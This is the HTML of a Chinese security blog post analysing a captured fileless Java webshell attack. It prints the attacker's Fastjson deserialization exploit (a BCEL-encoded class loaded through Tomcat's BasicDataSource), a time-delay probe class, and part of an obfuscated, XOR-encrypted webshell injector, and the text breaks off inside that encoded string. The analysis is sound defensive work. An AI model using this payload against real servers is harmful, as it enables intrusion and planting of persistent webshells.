<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x1 前言前段时间看到宽字节安全公众号发的《java恶意样本调试指南》，文章对捕获的一个无文件Webshell进行了分析。刚看到这篇文章开头部分样本反编译的截图时，我就认出了他。时隔一年，他又来了，还是熟悉的配方，熟悉的味道。 去年我们也捕获到了一个类似的样本，加密手法如出一辙，当时我和团队的小伙伴折腾了不少时间去分析攻击者的整个攻击过程，包括无文件Webshell的解密、Webshell加密通">
<meta property="og:type" content="article">
<meta property="og:title" content="记一次无文件Webshell攻击分析">
<meta property="og:url" content="http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="长夏">
<meta property="og:description" content="0x1 前言前段时间看到宽字节安全公众号发的《java恶意样本调试指南》，文章对捕获的一个无文件Webshell进行了分析。刚看到这篇文章开头部分样本反编译的截图时，我就认出了他。时隔一年，他又来了，还是熟悉的配方，熟悉的味道。 去年我们也捕获到了一个类似的样本，加密手法如出一辙，当时我和团队的小伙伴折腾了不少时间去分析攻击者的整个攻击过程，包括无文件Webshell的解密、Webshell加密通">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/1.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/2.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/3.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/4.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/5.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/6.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/7.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/8.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/9.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/10.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/11.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/12.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/13.png">
<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/14.png">
<meta property="article:published_time" content="2021-07-12T22:22:47.000Z">
<meta property="article:modified_time" content="2022-04-17T14:57:34.567Z">
<meta property="article:author" content="长夏">
<meta property="article:tag" content="无文件Webshell">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>记一次无文件Webshell攻击分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="长夏" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2022/04/29/%E5%91%8A%E5%88%AB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/01/23/%E5%86%8D%E8%A7%81%EF%BC%8C2020/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&text=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&is_video=false&description=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=记一次无文件Webshell攻击分析&body=Check out this article: http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&name=记一次无文件Webshell攻击分析&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&t=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-前言"><span class="toc-number">1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-攻击分析"><span class="toc-number">2.</span> <span class="toc-text">0x2 攻击分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-加密分析"><span class="toc-number">3.</span> <span class="toc-text">0x3 加密分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-无文件Webshell分析"><span class="toc-number">4.</span> <span class="toc-text">0x4 无文件Webshell分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x5-流量解密"><span class="toc-number">5.</span> <span class="toc-text">0x5 流量解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x6-冰蝎改造"><span class="toc-number">6.</span> <span class="toc-text">0x6 冰蝎改造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-新样本分析"><span class="toc-number">7.</span> <span class="toc-text">0x7 新样本分析</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        记一次无文件Webshell攻击分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">长夏</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-07-12T22:22:47.000Z" itemprop="datePublished">2021-07-12</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/%E6%97%A0%E6%96%87%E4%BB%B6Webshell/" rel="tag">无文件Webshell</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>前段时间看到宽字节安全公众号发的<a href="https://mp.weixin.qq.com/s/yvEHxhsedSwB12PTcQ5aRg" target="_blank" rel="noopener">《java恶意样本调试指南》</a>，文章对捕获的一个无文件Webshell进行了分析。刚看到这篇文章开头部分样本反编译的截图时，我就认出了他。时隔一年，他又来了，还是熟悉的配方，熟悉的味道。</p>
<p>去年我们也捕获到了一个类似的样本，加密手法如出一辙，当时我和团队的小伙伴折腾了不少时间去分析攻击者的整个攻击过程，包括无文件Webshell的解密、Webshell加密通信流量的解密等，整个过程受益匪浅，收获颇丰。</p>
<p>时间过去了那么久，重逢即是缘分，那就重温一下，最后也对比看看宽字节安全大佬发出来的样本吧。</p>
<h2 id="0x2-攻击分析"><a href="#0x2-攻击分析" class="headerlink" title="0x2 攻击分析"></a>0x2 攻击分析</h2><p>从流量中提取攻击的EXP，发现是Fastjson反序列化漏洞的利用，EXP使用了Unicode编码。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/1.png" alt=""></p>
<p>解码后发现使用<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code>类进行Fastjson反序列化漏洞攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">        &quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,</span><br><span class="line">        &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dPMO$c2$40$Q$7d$L$fd$b2$82$a0$e0$b7$i$3c$98$m$H$a9$m$W$S$e2E4$f1$fb$m$f1$be$5dV$z$96$d2$d4b$f4$l$f8O$3csQ$e3$c1$l$e0$8f2N$h$a3$f1$e6lvf$f6$ed$9b$b73$fb$f1$f9$f6$O$a0$86$92$J$D3$w$S$x$3c$9a$u$a0$a8c$d6$84$8a9$j$f3$3a$W$Y$b4$b6$eb$bb$d1$OC$ba$bc$7e$c1$a0$ec$O$7b$92$nw$ec$fa$f2t4pd$d8$e5$8eG$88$d1$W$de73$7b$kqqs$c2$83$e4$8a$E$Z$cc$f3$e1$u$Ur$df$8d$a9$95$ceh0x$Q$ad$86$z6e$b3$de$92$f6$d6e$bd$e1$f4$yGr$7b$bbW$TV$d3$b6$ac$8d$3e$bf$e3$ZL$c0$d4$b1$98$c1$S$96$Z$K1V$f5$b8$7fU$dd$bb$X2$88$dc$a1$9f$c1$KL$86$b5$7f$892$e4$7f$r$ce$9c$be$U$d1$l$a8$7b$jJ$decPo$3d$v$D$g$b7$7c$YO$9d$LB$d7$8f$92$b1$ba$n$X$S$ab$d0$e9$ebbK$81$c5$3d$92$9f$a4S$89$o$a3$a8V$5e$c0$c6$940d$c8k$Jh$d0$ca$feP$3bI$v$90$x$o$f5$K$e5$J$c6Q$e5$Z$da8$B5$d2T$89$Q$XO$nM$5e$nL$a5$5c$a3$Nz$3du$a0$p$a7$Q9$9f41$fd$F$f5$a1$86$d1$d5$B$A$A&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>BCEL解码出来得到class文件，反编译后发现是通过时间延迟来验证是否存在Fastjson反序列化漏洞，如果存在漏洞并且<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code>链可用的话，响应会延迟大约5秒。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Dummyc957c1e839e74f35bd0bea76d2c08700 &#123;</span><br><span class="line">    public Dummyc957c1e839e74f35bd0bea76d2c08700() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(5000L);</span><br><span class="line">        &#125; catch (Exception var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行了几次时间延迟确认存在漏洞后，后面就是利用EXP注入无文件Webshell的过程。同样的进行解码、反编译后得到Macroprism类代码，主要用来实现注入无文件Webshell，但是关键的地方做了加密。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/2.png" alt=""></p>
<h2 id="0x3-加密分析"><a href="#0x3-加密分析" class="headerlink" title="0x3 加密分析"></a>0x3 加密分析</h2><p>一开始想着要拿到解密的内容并不难，这个代码本身就是实现了解密，只需要把解密结果存放的数组array2打印出来就行了，但是结果发现并没有那么简单，反编译的Macroprism类代码似乎有点问题，没法正常运行。</p>
<p>去掉无文件Webshell实现部分，单拿解密部分代码出来，大致分析一下发现是异或加密。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">public class Macroprism</span><br><span class="line">&#123;</span><br><span class="line">    public static int a;</span><br><span class="line">    public static int b;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        final String[] array &#x3D; new String[55];</span><br><span class="line">        int n &#x3D; 0;</span><br><span class="line">        String s;</span><br><span class="line">        int n2 &#x3D; (s &#x3D; &quot;-mX4p\u001d\u00147zF+m\u0004\u00109k&#x2F;\u0015M~JN&gt;4\u0019W|J[!8\u0019^mJZ:&lt;\u0016\u0011&#125;\u0001\\-&#39;\u0013Om\u000b]&#96;\&quot;\u001f]7\&quot;F\&quot;!\u001fMT\u0005_\u0010\u0010^o\u0005\u0001;!\u0013S7&amp;N&#x3D;0L\u000b\u0018\u0010^o\u0005\u0001;!\u0013S7&amp;N&#x3D;0L\u000b&#x3D; J-:\u001eZk\f\u001b[&#125;\&quot;F\&quot;!\u001fM]\u0001I\r\tZm\&quot;F\&quot;!\u001fMW\u0005B+\u0006T\\u\u0005\\&#x3D;\t\u0017P&#125;\rI&#39;0\bL\u000e\tZm\&quot;F\&quot;!\u001fMZ\bN&#x3D;&amp;\u0007\u001dZm*@:0.\u0015M~JN&gt;4\u0019W|JL&#x2F;!\u001bSp\nN&#96;6\u0015M|Jn&gt;%\u0016Vz\u0005[&#39;:\u0014&#123;p\u0017_&#x2F;!\u0019W|\u0016\u0006\u000e^k\u0003J:\u0013\u001dZm3@&lt;&gt;\u001fMM\f]+4\u001eqx\tJ\t?Q&#125;\u0014@&#39;;\u000e\u001b\f2Pk\rU!;\u000eVz\u0005C$\u0015M~JN&gt;4\u0019W|JL&#x2F;!\u001bSp\nN&#96;1\u001fOu\u000bV&#96;\u0013\u0013Sm\u0001]\n0\u001c\u0011\n^k\u0017J\f4\tZ&#x2F;Pm&#39;;\u001bM&#96; \u0010^o\u0005W&#96;-\u0017S7\u0006F 1T&#123;x\u0010N:,\nZZ\u000bA80\bK|\u0016\u0014\u0010^o\u0005W&#96;&amp;\u001fMo\bJ:&#123;&lt;Vu\u0010J&lt;\n\u001cVu\u0010J&lt;\u0018\u001bOj\u0006\u001eZz\u000bK+&#x2F;\u0015M~JN&gt;4\u0019W|J[!8\u0019^mJZ:&lt;\u0016\u0011&#125;\u0001\\-&#39;\u0013Om\u000b]&#96;\&quot;\u001f]7\&quot;F\&quot;!\u001fM]\u0001I\u1048\u0003I&#x2F;RY)\u0014;~]-n:\u0014\u0015~T5m\u001e\u0016\u001d~a%i\u000f\u001e;&#123;\\%z\u001f6;j~\u0007n\u001b\&quot;\u001d~O%\\\u000f\u0017;&#125;O&#39;n\f\u00029XX\tn\b66~X5n\u0019\u0014\u001d~N5\\\u000f\u0002\u001d&#125;&#123;&#39;n\f69H[\u0005n\be3~_Pd\u000f\u0013B~@%L\u000f\f+\\X&#x3D;H!\u0014?X[4l)\u0014)~^)f\u000f\u0012+tX&amp;f\u000f\u000f+PX!H\f89XX\tn\t61~[!n&#x2F;\u0014\u0015~A\u0013m&gt;\u0016\r~\\%h!\u001d;xj&#x2F;n\f\&quot;;kn\u000bn,\u00148KZ\u0003n-\u0014&#x3D;\u000bQ%hv\u001e;|)%L\u000f:;\\H&amp;V\r2;XX\&quot;n\u0006\u00142rR%l\u001f\u0014.Hz%K\u000f:;wX&amp;\u001e\r2;RX,v\u0005\u00149nX\u0000X!\u0014\&quot;H[Pl)\u0014\u001d~Q\u000fd\u000f\u001d?~|\u0003L\u000f0\rPX(~\f\r8H[\\l9\u0017C~QPg\u000f\u001dBwX-n\f\u0014;f!\u0005x&#123;%\u001e&#123;-&amp;n\u000f\u0018\u0015tO&#x3D;m\u000f\u0014(&#123;&#123;V&#125;\&quot;\u0014+~I0h\&quot;  j,UM\u0019\u001f\u0016\\u6G\u00178\u0002SX5n&#x2F;\u001e?Gh&#x3D;w\u0014&#x3D;6\ra\fM#6\fn+\u001cG-f4r&#123;Vi%\u000f\&quot;v.&#x2F;y\u0017\u0017;~_\nn\u001f\u0014,t_\u0010l\u0005\u0000\u0002N@&lt;u&amp;\u0019HGq\u0006B-#+\ra\fL&#125;\u0018M~H%j&#x2F;\u0002OO&#125;%j\u000f\u001d\u0003WT\u0005B\bg#g~\u0012L|\u0003\u0003[t\u001cC*\u0016Cxx3W~\u000f\&quot;u]\u0006\u001d&#123;8\u001bhzSd\u0018\f8~X\u0014i+\u00124Sz,&#125;&gt;7H\nc&amp;X\r\u0017;nX-u\tl&#x3D;^N\u001c\u001f\u0014\r3&#125;X\&quot;\\!\u0001&#x3D;Oq\u0000B\ba6\fW\bL \u000f\teA5Y\u001bg,F&#125;\tW\&quot;1&lt;uu\u0007w\u00189\u0019\fHS&#123;\t%\u0012[t\&quot;\u001b\u0002f4Sz\nu&#x3D;\u000f\&quot;no1\u001d\u0018,\u001eRa\bK\b\u001f\u0016\\*&amp;Y,;4SVTW?\f\&quot;eq\u0001lw&#x2F; gSVM\t\u0003Js)&gt;_,\u001d(Sz\u000fa!\f-Sl+V\&quot;\u0002;nX*z&#125;\u0007\u0012f+\u0010a\u0017\r8j@3e&#x3D;\u000f+\\X1H-\u0014&#x2F;Hz%M96;X~\u0007n)\&quot;\u0019~q%L\u000f&#x3D;+\\X\fH-\u0014\u001bHz%I\u000f6;Wn!n\fg(SzW&#125;77IT[%n&gt;\u0001\u0018\fO\u001dv|\u0003&#x3D;^N\u001cC\u000f\u0004;mJ#\u001674\&quot;Oo\u0006A\u001c%#\r_\u0017c#%\u0012[t!b\u000f\u00117~W%X\u000f\u0018\r~* n\r\u001c;vr&amp;n\r\u0003\u000bfA&gt;G+\u0016CEC&lt;e|7&#x3D;i)(\u001d&amp;e\u001ewX\u0012|\u0006\u0007J\\_*C-; LC&lt;&#125;\u001d\u000f\&quot;y(&gt;w\u0000e;nX\tN#\u0013HfA\u0003Y-g,F&#125;\tW\&quot;19\u0006v\u0000g\u001c\&quot;6\u000fqTK\u0006\u0017.eA.\u001d,\u0012,\u000fL\ty46&#x3D;\u0006l\u0007\u001d\u001b\u0017;~i2L|\u0003\u0003sL\&quot;A\u0014\u0002O\u000f]%l\u0005\u00143L[%g\b\u001b\u0018\fi\u0014M\t-\u0012sc1Z\u0003\u0016;POVC;\u000f&#x3D;\u0006*\u0007V\f\u001a,|X\u001cb\ra\rp&#96;&amp;w&#x2F;\u0002N\rW \\)0&gt;f)&#x2F;|\f\u0017\u0019w[\u0017u\u00181\u0016fr\u0010_*\u0016B\u000eT\u001eL;\u0018\u0000f~&#x2F;j:\u001c,z()c\r\u0017\t^N\u0010C\u0007\u0010\u001eS@V[8\u001e)&#125;]\u0005g\u0004#\u0018hL\u0012&#96;\n\u0004\u000frZP\u001f\u0001\u0001#JT0D)\u0000Hyt&#x3D;w\u0004%6EL\u001ea7a\u0000q~\u0013n$\u00149q]%l\u0001\u00143\u0007[%n\bd8HZ5k\u000f\u0016(~S-m\u000f\u0017;\u000b@\u001ef\u007f\u000f&#x3D;ep&gt;x\u001c85hLTb\n\u001f\u0012&#123;X&#39;&#123;\u000f\u001f+&#125;X%a\f\u0007,rQ%f\u001b\u0018;uL%C)\u0010;w+\u0014G*8&lt;\u000bUVa70\&quot;&#125;)\u0006Vw&#x2F;\u0019xO\u000ec\u007f\u001b\u0016f*.C*\u0010\u000eS|2a9\u000f-r[%m*$#gC\fc|-\u0012]t\u0007Y\u001bf(Fx3\u001a \u0004\u0014ii\u0006h\u001c9\u0019Xn%C9\u0016#~H%n\n\u00149gX.D\u0003\u00140PX\tX9\u0014\u0014~Z\u0000k\u000f\u0014\u0000~SPb\u000f\u0011\u0015~w\u0013X\u000f:;|q%~\u000f1\u001bR_Vv\u001dl\n]&#96;]l+\r(SH&lt;e7\f\&quot;SI\u0000w\u001c\&quot;\u001egK0K\u0006\u001f\u0016fNTg\u000f\u001c#rX&#x2F;f\u000f:\rHX\u0014n\r9;nX)|\tl\u0003^A\u0014Y,;(O@Vi&#x3D;\u0011;|t%d-\u001d;t~)n\u0005&gt;;N~!n\b;4\u000e&#123;\r\u0016:4\&quot;qs(\u001f\u0004\u0017&#x2F;\u000fLVa\u000b\u0007\u0016f+]D\u0014\r3&#125;X&amp;m?\f\&quot;eq(\u001d6&#x3D;\u0018Rz\u0012z&#125;\u0007\u0003^NQA\n\u00149MX.\u001f\u0003\u0014&gt;rX\u0016n9\u0014\bnZ\u0011k\u000f\u0016\f~U%b\u000f\u0011\u001d~V5X\u000f&amp;+|&#96;%~\u000f\u0004\u001bR_Vv\u001dl\tfNQA\u0002eCVx\ty$1;zX!\u001d&gt;&#x3D;\u001eR\\\u0012M\t\u0013\u000fe&#96;]z&#x2F;\u001d0I&#125;Vi&#39;7&#x3D;jQ%f\u001f\u0018;&#123;-%\\9\u0010;yN\u0014G*8?I&#123;#i;\u000f\u0003\u0006]\u0006h\b&#x2F;\u0019\u000fa\u0012v\u0019\u0007\u0016\\~!n\b\u0012\nW&#125;\tiz\u0019Iqu\u0007A\u0014&amp; gH\u0012&#125;#9\t[^2V\u000f\u0004;Zx\ti|\f\&quot;Xo\u0007\u001d\u0018,\u001eRa\bK\rl.eA.\u001d,\u0012,\u000fK&lt;G$\u000f\&quot;&#125;)\u0005xw ;nX\u0007N#\u0013HfA\u0003Y-g,F&#125;\tW\&quot;19\u0006M&gt;w\u0004g\u0018xOTz#\u0003\u0002[N2U*\u0014?~Q3_&amp;1\u0017y-(\u001c\u00009\u0019QC\u0017u\u0016\u0004\fj+2V*8\u0002S&#125;\&quot;e\&quot;6I&#125;o\u0006A\u00009;nX&gt;N#\u0013HfA\u0003Y-g,F&#125;\tW\&quot;19\u0006^\u0005x6e gS N\t\u0013\n]~!n\u000bg\nW&#125;\tiz\u0019Hq&#96;\u0001w\fe\u0018F  